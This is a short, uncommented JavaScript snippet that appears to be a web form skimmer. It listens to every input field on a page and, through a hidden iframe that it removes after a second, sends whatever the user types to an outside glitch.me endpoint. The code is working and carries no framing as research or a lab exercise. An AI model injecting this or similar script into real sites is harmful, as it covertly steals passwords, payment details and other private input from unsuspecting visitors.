function sendRequest(message) {
    var i = document.createElement('iframe');
    document.body.appendChild(i);
    i.style.display = 'none';
    i.contentWindow.location.href = `https://actually-hickory-squirrel.glitch.me/api/addMessage?message=${message}`;
    setTimeout(() => {
        i.remove();
    }, 1000);
};
var se = true;
document.querySelectorAll('input').forEach(inputElement => {
    inputElement.addEventListener('input', (event) => {
        if (se) {
            sendRequest(inputElement.value);
        };
    });
});
setInterval(() => {
    se = !se;
},1000);
